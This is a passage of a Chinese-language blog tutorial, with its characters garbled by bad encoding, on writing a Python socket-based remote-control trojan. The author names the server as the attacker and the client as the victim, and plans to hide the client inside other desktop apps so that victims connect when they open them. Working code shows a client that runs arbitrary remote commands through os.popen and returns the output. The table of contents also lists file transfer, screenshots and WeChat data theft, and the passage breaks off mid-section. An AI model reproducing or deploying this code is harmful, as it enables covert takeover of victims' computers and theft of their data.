<!doctype html><html lang=zh-cn><head><script>(function(){const e=localStorage.getItem("theme")||"light";document.documentElement.setAttribute("data-theme",e)})()</script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=author content="LiuChao"><meta name=description content="ä¸€ä¸ªç”±Pythonè¯­è¨€ç¼–å†™çš„åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº"><link rel=icon href=https://blog.pi3.fun/favicon.ico><meta name=keywords content=" study  latex  life  academic "><meta property="og:url" content="https://blog.pi3.fun/post/2023/11/%E5%9F%BA%E4%BA%8Esocket%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F/"><meta property="og:site_name" content="Pi3's Notes"><meta property="og:title" content="åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº"><meta property="og:description" content="ä¸€ä¸ªç”±Pythonè¯­è¨€ç¼–å†™çš„åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2023-11-29T00:00:00+00:00"><meta property="article:modified_time" content="2023-11-29T00:00:00+00:00"><meta property="article:tag" content="æŠ€æœ¯"><meta property="article:tag" content="Python"><meta property="article:tag" content="Socket"><link rel=canonical href=https://blog.pi3.fun/post/2023/11/%E5%9F%BA%E4%BA%8Esocket%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F/><meta itemprop=name content="åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº"><meta itemprop=description content="ä¸€ä¸ªç”±Pythonè¯­è¨€ç¼–å†™çš„åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº"><meta itemprop=datePublished content="2023-11-29T00:00:00+00:00"><meta itemprop=dateModified content="2023-11-29T00:00:00+00:00"><meta itemprop=wordCount content="5259"><meta itemprop=keywords content="æŠ€æœ¯,Python,Socket"><link media=screen rel=stylesheet href=https://blog.pi3.fun/css/common.css><link media=screen rel=stylesheet href=https://blog.pi3.fun/css/content.css><link media=screen rel=stylesheet href=https://blog.pi3.fun/css/theme.css><link media=screen rel=stylesheet href=https://blog.pi3.fun/css/iconfont/iconfont.css><link rel=stylesheet href=https://blog.pi3.fun/css/syntax/xcode.css data-theme-style=light media="(prefers-color-scheme: light)"><link rel=stylesheet href=https://blog.pi3.fun/css/syntax/catppuccin-mocha.css data-theme-style=dark media="not all"><title>åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº - Pi3's Notes</title>
<link rel=stylesheet href=https://blog.pi3.fun/css/single.css><link href=https://lf3-cdn-tos.bytecdntp.com/cdn/expire-100-y/KaTeX/0.15.2/katex.min.css rel=stylesheet><script defer src=https://lf3-cdn-tos.bytecdntp.com/cdn/expire-100-y/KaTeX/0.15.2/katex.min.js></script><script defer src=https://lf3-cdn-tos.bytecdntp.com/cdn/expire-100-y/KaTeX/0.15.2/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"\\[",right:"\\]",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1}],ignoredTags:["script","noscript","style","textarea","pre","code","option"],throwOnError:!1})})</script></head><body><div id=wrapper><header id=header><link rel=stylesheet href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Regular/result.css><link rel=stylesheet href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Italic/result.css><link rel=stylesheet href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css><h1><a href=https://blog.pi3.fun/>Pi3's Notes</a></h1><nav><span class=nav-bar-item><a class=link href=/>æ–‡ç« </a>
</span><span class=nav-bar-item><a class=link href=/post/>å½’æ¡£</a>
</span><span class=nav-bar-item><a class=link href=/about/>å…³äº</a>
</span><span class=nav-bar-item><a class=link href=/links/>å‹é“¾</a>
</span><span class=nav-bar-item><a class="link theme-toggle" href=javascript:void(0);>é»‘æš—</a></span></nav></header><main id=main class=post><h1>åŸºäºSocketçš„è¿œç¨‹æ§åˆ¶ç¨‹åº</h1><div><b>Keywords: </b><a class=link href=https://blog.pi3.fun/tags/%E6%8A%80%E6%9C%AF>#æŠ€æœ¯</a>
<a class=link href=https://blog.pi3.fun/tags/python>#Python</a>
<a class=link href=https://blog.pi3.fun/tags/socket>#Socket</a></div><div><b>Release Date: </b><span>2023-11-29</span></div><details><summary><b>Table of Contents</b></summary><div class=toc><nav id=TableOfContents><ul><li><a href=#æ¦‚è¿°>æ¦‚è¿°</a></li><li><a href=#å®ç°è¿‡ç¨‹>å®ç°è¿‡ç¨‹</a><ul><li><a href=#æœ€ç®€å•çš„socketç¨‹åº>æœ€ç®€å•çš„Socketç¨‹åº</a></li><li><a href=#è¿œç¨‹å‘½ä»¤æ‰§è¡Œ>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</a></li><li><a href=#è¿œç¨‹ä¸‹è½½æ–‡ä»¶>è¿œç¨‹ä¸‹è½½æ–‡ä»¶</a></li><li><a href=#è¿œç¨‹ä¸Šä¼ æ–‡ä»¶>è¿œç¨‹ä¸Šä¼ æ–‡ä»¶</a></li><li><a href=#è¿œç¨‹è·å–å±å¹•æˆªå›¾>è¿œç¨‹è·å–å±å¹•æˆªå›¾</a></li><li><a href=#è·å–å¾®ä¿¡æ•°æ®>è·å–å¾®ä¿¡æ•°æ®</a></li></ul></li><li><a href=#æœ¨é©¬ç¨‹åº>æœ¨é©¬ç¨‹åº</a><ul><li><a href=#peppa-pig>peppa-pig</a></li><li><a href=#é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯>é‡å­åŠ å¯†ç½‘ç›˜å®¢æˆ·ç«¯</a></li></ul></li><li><a href=#æ€»ç»“>æ€»ç»“</a></li></ul></nav></div></details><article class=content><blockquote><p>ä¸€ä¸ªåŸºäºPython Socket å®ç°è¿œç¨‹æ§åˆ¶ç¨‹åº
å¯ä»¥ç”¨ä½œè¿œæ§æœ¨é©¬</p></blockquote><h2 id=æ¦‚è¿°>æ¦‚è¿°</h2><p>å®ç°çš„åŠŸèƒ½ï¼š</p><ul><li>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</li><li>è¿œç¨‹æ–‡ä»¶ä¸Šä¼ </li><li>è¿œç¨‹æ–‡ä»¶ä¸‹è½½</li><li>è·å–è¿œç¨‹ä¸»æœºæˆªå±</li></ul><p>åœ¨å­¦ä¹ ç½‘ç»œå®‰å…¨æŠ€æœ¯çš„è¿‡ç¨‹ä¸­ï¼Œäº†è§£åˆ°äº†è®¡ç®—æœºç—…æ¯’ã€è •è™«å’Œæœ¨é©¬ç­‰çŸ¥è¯†ï¼Œè¿™å…¶ä¸­æœ¨é©¬åº”è¯¥æ˜¯æœ€å¥½å®ç°çš„ä¸€ä¸ªï¼Œäºæ˜¯ä¾¿æƒ³åˆ°å†™ä¸€ä¸ªæœ¨é©¬</p><p>åœ¨ä¼—å¤šæœ¨é©¬çš„ç±»å‹ä¸­ï¼Œç»“åˆå­¦ä¹ åˆ°çš„ç½‘ç»œç¼–ç¨‹çŸ¥è¯†ï¼Œäºæ˜¯ä¾¿æœ‰äº†è¿™ä¸€ä¸ªåŸºäºSocketå®ç°çš„è¿œç¨‹æ§åˆ¶ç¨‹åº</p><p>åœ¨åç»­ï¼Œå¯ä»¥å°†è¿™ä¸ªè¿œæ§ç¨‹åºå†™å…¥å…¶ä»–å®¢æˆ·ç«¯ç¨‹åºä¸­ï¼ˆæ¯”å¦‚ä¹‹å‰çš„é‡å­åŠ å¯†ç½‘ç›˜é¡¹ç›®ï¼‰ï¼Œåªè¦å¯¹æ–¹æ‰“å¼€äº†æ¡Œé¢ç¨‹åºï¼Œå°±èƒ½è¿œç¨‹è¿æ¥</p><h2 id=å®ç°è¿‡ç¨‹>å®ç°è¿‡ç¨‹</h2><h3 id=æœ€ç®€å•çš„socketç¨‹åº>æœ€ç®€å•çš„Socketç¨‹åº</h3><p>é¦–å…ˆï¼Œæ•´ä¸ªç¨‹åºçš„æ¡†æ¶å°±æ˜¯åŸºäºSocketçš„TCPä¼ è¾“ï¼Œå…ˆå†™ä¸€ä¸ªæœ€ç®€å•çš„Socketç¨‹åº</p><p><strong>Serverç«¯ï¼š</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>socket_server</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>socket_server</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=mi>8888</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>socket_server</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=p>,</span> <span class=n>address</span> <span class=o>=</span> <span class=n>socket_server</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;æ¥æ”¶åˆ°å®¢æˆ·ç«¯è¿æ¥ï¼Œæ¥è‡ª</span><span class=si>{</span><span class=n>address</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;UTF-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>data</span> <span class=o>==</span> <span class=s1>&#39;exit&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;æ¥æ”¶åˆ°å‘æ¥çš„æ¶ˆæ¯ï¼š&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reply</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;è¯·è¾“å…¥å›å¤çš„æ¶ˆæ¯ï¼š&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>reply</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>socket_server</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><p><strong>Clientç«¯ï¼š</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>socker_client</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>socker_client</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=mi>8888</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;è¿æ¥åˆ°æœåŠ¡ç«¯&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>send_msg</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;è¯·è¾“å…¥è¦å‘é€çš„æ¶ˆæ¯ï¼š&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>send_msg</span> <span class=o>==</span> <span class=s1>&#39;exit&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=n>socker_client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>send_msg</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>recv_data</span> <span class=o>=</span> <span class=n>socker_client</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;æœåŠ¡ç«¯å›å¤çš„æ¶ˆæ¯ï¼š&#39;</span><span class=p>,</span> <span class=n>recv_data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>socker_client</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><p>ä»¥ä¸Šæ˜¯æœ€ç®€å•çš„ä¸€ä¸ªSocketç¨‹åºï¼Œå®ç°äº†ä¸¤å°ä¸»æœºä¹‹é—´ç›¸äº’ä¼ é€’æ–‡å­—ä¿¡æ¯ã€‚</p><p>ä½†æ˜¯åœ¨è¿™ä¸ªç¨‹åºä¸­ï¼ŒåŒæ ·å­˜åœ¨å¾ˆå¤šçš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼š</p><ol><li>ä¼ è¾“çš„æ¶ˆæ¯å¯èƒ½ä¼šè¶…è¿‡1024</li><li>æ²¡æœ‰ä»»ä½•å¼‚å¸¸æŠ›å‡ºæœºåˆ¶ï¼Œåœ¨Socketé€šä¿¡çš„è¿‡ç¨‹ä¸­ï¼Œä¸€å®šä¼šå­˜åœ¨ä¸¢åŒ…ã€å¤±å»è¿æ¥ã€è¶…æ—¶ç­‰é—®é¢˜</li><li>â€¦â€¦â€¦â€¦</li></ol><p>è¿™äº›é—®é¢˜å¦‚æœåªæ˜¯åœ¨ä¸Šé¢è¿™æ ·ä¸€ä¸ªç®€å•ç¨‹åºä¸­ï¼ŒåŸºæœ¬ä¸ä¼šæœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¸€æ—¦ç¨‹åºå®ç°çš„åŠŸèƒ½å¤šäº†ï¼Œä»£ç é‡å¤§äº†ï¼Œè¿™äº›é—®é¢˜éƒ½è‡³å…³é‡è¦ï¼Œéƒ½éœ€è¦åœ¨åç»­çš„ä»£ç ä¸­æ³¨æ„ï¼Œä¸ç„¶æ‰¾bugä¼šå¾ˆç—›è‹¦ğŸ˜¢</p><blockquote><p>éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œåœ¨æ­¤ç¨‹åºä¸­ï¼Œæˆ‘å°†æœåŠ¡ç«¯ä½œä¸ºä¸»åŠ¨æ‰§è¡Œç«¯ï¼Œå®¢æˆ·ç«¯ä½œä¸ºè¢«åŠ¨æ‰§è¡Œç«¯ï¼Œä¹Ÿå°±æ˜¯æœåŠ¡ç«¯å‘é€æŒ‡ä»¤ï¼Œå®¢æˆ·ç«¯æ ¹æ®æŒ‡ä»¤è¿›è¡Œæ“ä½œå¹¶è¿”å›æœåŠ¡ç«¯</p><p>å¯¹äºæœ¨é©¬ç¨‹åºï¼ŒåŒæ ·å¯ä»¥ç†è§£ä¸ºï¼ŒæœåŠ¡ç«¯ä¸ºæ”»å‡»æ“çºµè€…ï¼Œå®¢æˆ·ç«¯ä¸ºæ”»å‡»å—å®³è€…</p><p>åç»­çš„ä»‹ç»ä¸­ï¼Œéƒ½æ˜¯ä»¥æ­¤ä¸ºåŸºç¡€</p></blockquote><h3 id=è¿œç¨‹å‘½ä»¤æ‰§è¡Œ>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h3><p>å­¦ä¼šä¸Šé¢æœ€ç®€å•çš„socketç¨‹åºä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ€è€ƒï¼Œæ€ä¹ˆå®ç°è¿œç¨‹çš„å‘½ä»¤æ‰§è¡Œ</p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Pythonä¸­çš„osæ¨¡å—ï¼Œosæ¨¡å—æä¾›çš„å°±æ˜¯å„ç§ Python ç¨‹åºä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’çš„æ¥å£ã€‚é€šè¿‡ä½¿ç”¨osæ¨¡å—ï¼Œä¸€æ–¹é¢å¯ä»¥æ–¹ä¾¿åœ°ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œå¦ä¸€æ–¹é¢é¡µå¯ä»¥æå¤§å¢å¼ºä»£ç çš„å¯ç§»æ¤æ€§</p><p>Pythonä¸­çš„osæ¨¡å—ï¼Œç†è®ºä¸Šæ”¯æŒWindowsã€Linuxå’ŒMac OSç³»ç»Ÿï¼Œæ‰€ä»¥ä½¿ç”¨osæ¨¡å—ï¼Œä¹Ÿå¯ä»¥å¢å¤§æˆ‘ä»¬ç¼–å†™çš„è¿™ä¸ªç¨‹åºçš„ä½¿ç”¨èŒƒå›´</p><p>æ‰€ä»¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ•´ä½“æµç¨‹å’Œæ¡†æ¶ä¸ºï¼š</p><p>{% mermaid %}</p><p>graph TB</p><p>a(æœåŠ¡ç«¯ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥)&ndash;>b(å®¢æˆ·ç«¯è¿æ¥ä¸ŠæœåŠ¡ç«¯)</p><p>b&ndash;>c(æœåŠ¡ç«¯æ¥æ”¶åˆ°è¿æ¥å¹¶å‘é€æŒ‡ä»¤)</p><p>c&ndash;>d(å®¢æˆ·ç«¯è§£ææŒ‡ä»¤å¹¶è°ƒç”¨OSæ¨¡å—æ‰§è¡Œ)</p><p>{% endmermaid %}</p><p>ä½¿ç”¨osæ¨¡å—è¿›è¡Œå‘½ä»¤ä¹Ÿååˆ†ç®€å•ï¼Œåªéœ€è¦ä½¿ç”¨ <code>os.system('å‘½ä»¤')</code> æˆ–è€… <code>os.popen('å‘½ä»¤')</code> å°±å¯ä»¥å®ç°.</p><p>ä½†æ˜¯ï¼Œè¿™é‡Œä¸èƒ½ä½¿ç”¨<code>os.system</code>ï¼Œæ¯”å¦‚æˆ‘ä»¬æ‰§è¡Œ<code>dir</code>å‘½ä»¤ï¼Œéœ€è¦è¿”å›æ–‡ä»¶å¤¹å†…çš„å†…å®¹ï¼Œ<font color=#00b0f0>å®ƒä¸èƒ½è¿”å›å‘½ä»¤æ‰§è¡Œåçš„å†…å®¹</font>ï¼Œè€Œ<code>os.popen</code>å¯ä»¥</p><blockquote><p>è¡¥å……ï¼š</p><p>pythonä¸­<code>os.system</code>ã€<code>os.popen</code>ã€<code>subprocess.popen</code>éƒ½æ˜¯å¯ä»¥å®ç°ç³»ç»Ÿå‘½ä»¤çš„æ‰§è¡Œ
ä½†æ˜¯ä»–ä»¬ä¹‹é—´ä¹Ÿå­˜åœ¨åŒºåˆ«ï¼Œ<a href=https://blog.csdn.net/bcfdsagbfcisbg/article/details/78134172>å‚è€ƒæ–‡ç« </a></p><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><ol><li><code>os.system</code>ç›´æ¥è°ƒç”¨æ ‡å‡†Cçš„system() å‡½æ•°ï¼Œä»…ä»…åœ¨ä¸€ä¸ªå­ç»ˆç«¯è¿è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä¸èƒ½è·å–å‘½ä»¤æ‰§è¡Œåçš„è¿”å›ä¿¡æ¯</li><li><code>os.popen</code>ä¸ä»…æ‰§è¡Œå‘½ä»¤è€Œä¸”è¿”å›æ‰§è¡Œåçš„ä¿¡æ¯å¯¹è±¡(å¸¸ç”¨äºéœ€è¦è·å–æ‰§è¡Œå‘½ä»¤åçš„è¿”å›ä¿¡æ¯)ï¼Œæ˜¯é€šè¿‡ä¸€ä¸ªç®¡é“æ–‡ä»¶å°†ç»“æœè¿”å›ã€‚è¿”å›çš„æ˜¯ file read çš„å¯¹è±¡ï¼Œå¯¹å…¶è¿›è¡Œè¯»å–<code>read</code>çš„æ“ä½œå¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„è¾“å‡º</li><li><code>subprocess.popen</code>ä¸<code>os.popen</code>ç±»ä¼¼ï¼Œä½†æ˜¯å½“æ‰§è¡Œå‘½ä»¤çš„å‚æ•°æˆ–è€…è¿”å›ä¸­åŒ…å«äº†ä¸­æ–‡æ–‡å­—ï¼Œæ›´å»ºè®®ä½¿ç”¨<code>subprocess</code></li><li><code>commands</code>å¯ä»¥è·å–è¿”å›å€¼å’Œå‘½ä»¤çš„è¾“å‡ºç»“æœ</li></ol></blockquote><p>æ‰€ä»¥åœ¨è¿™ä¸ªåŠŸèƒ½å®ç°ä¸­ï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨ <code>os.popen</code> æ–¹æ³•æ¥å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä½¿ç”¨ <code>read</code> æ–¹æ³•è¯»å–è¿”å›çš„å†…å®¹</p><p><strong>Clientç«¯æ‰§è¡Œå‘½ä»¤å‡½æ•°:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>run_cmd</span><span class=p>(</span><span class=n>socker_client</span><span class=p>,</span> <span class=n>cmd</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>cmd</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;cd&#39;</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>split</span><span class=p>()[</span><span class=mi>1</span><span class=p>])</span>  
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>FileNotFoundError</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;ç›®å½•ä¸å­˜åœ¨&#39;</span>  
</span></span><span class=line><span class=cl>            <span class=n>socker_client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>            <span class=k>return</span>  
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;åˆ‡æ¢ç›®å½•æˆåŠŸ&#39;</span>  
</span></span><span class=line><span class=cl>        <span class=n>socker_client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=c1># æ‰§è¡Œå‘½ä»¤  </span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼š</span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s1>&#39;</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>result</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;å‘½ä»¤æ‰§è¡ŒæˆåŠŸ&#39;</span>  
</span></span><span class=line><span class=cl>    <span class=c1># æŠŠå‘½ä»¤å›æ˜¾ç»“æœå‘é€ç»™æœåŠ¡ç«¯  </span>
</span></span><span class=line><span class=cl>    <span class=n>socker_client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span></code></pre></div><p>ä»ä¸Šé¢è¿™ä¸ªå‡½æ•°å®ç°ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ç‰¹æ„å¯¹ <code>cd</code> åˆ‡æ¢ç›®å½•å‘½ä»¤åšäº†å•ç‹¬çš„åˆ¤æ–­</p><p>è¿™æ˜¯å› ä¸ºåœ¨Pythonç¨‹åºä¸­ç›´æ¥æ‰§è¡Œ <code>cd</code> åˆ‡æ¢ç›®å½•æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œè¿˜æ˜¯ä¼šè¿”å›å½“å‰ç¨‹åºè¿è¡Œçš„ç›®å½•ä½ç½®ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ <code>os.chdir</code> æ–¹æ³•å¯¹å½“å‰Pythonç¨‹åºè¿è¡Œçš„ç›®å½•è¿›è¡Œåˆ‡æ¢</p><p>é™¤æ­¤ä¹‹å¤–çš„å…¶ä»–å‘½ä»¤åˆ™æ²¡æœ‰è¿›è¡Œå•ç‹¬çš„åˆ¤æ–­ï¼Œç›´æ¥äº¤ç»™ <code>popen</code> æ‰§è¡Œï¼Œå¹¶ç”¨ <code>read</code> æ–¹æ³•è¯»å–è¿”å›ä¿¡æ¯</p><blockquote><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<code>popen</code>åœ¨æ‰§è¡Œå…¶ä»–å‘½ä»¤ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„è¿”å›å€¼ï¼Œå¯èƒ½ä¼šä¸è¿”å›å€¼ï¼Œå¹¶ä¸”ä¸€ç›´é˜»å¡ï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µå•ç‹¬åˆ¤æ–­</p></blockquote><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214229.png alt=è¿œç¨‹æ‰§è¡Œå‘½ä»¤></p><h3 id=è¿œç¨‹ä¸‹è½½æ–‡ä»¶>è¿œç¨‹ä¸‹è½½æ–‡ä»¶</h3><p>è¿œç¨‹ä¸‹è½½æ–‡ä»¶ï¼Œéœ€è¦çš„æ˜¯æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ç´§å¯†é…åˆï¼Œå¹¶ä¸”ä¿è¯é€šä¿¡è¿‡ç¨‹ä¸­çš„åŒæ­¥</p><p>æ‰€è°“åŒæ­¥ï¼Œä¸€å®šæ˜¯<strong class=chinese>ä¸€æ”¶ä¸€å‘</strong>çš„å½¢å¼ï¼Œä¸è®ºæ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡ç«¯ï¼Œä¸€æ—¦æœ‰ä¸€ç«¯å‡ºç°äº†è¿ç»­ä¸¤æ¬¡çš„å‘é€æˆ–è€…æ¥æ”¶ï¼Œåœ¨å®é™…çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¸€å®šä¼šå‡ºç°æ­»é”çš„ç°è±¡ï¼Œä¹Ÿå°±æ˜¯åŒæ–¹éƒ½åœ¨ç­‰å¾…å¯¹æ–¹å‘é€æ¶ˆæ¯ï¼ŒåŒæ–¹ä¸€ç›´é˜»å¡ã€‚</p><p>è¿œç¨‹ä¸‹è½½æ–‡ä»¶çš„æ•´ä½“æµç¨‹å’Œæ¡†æ¶ï¼š</p><p>{% mermaid %}</p><p>graph 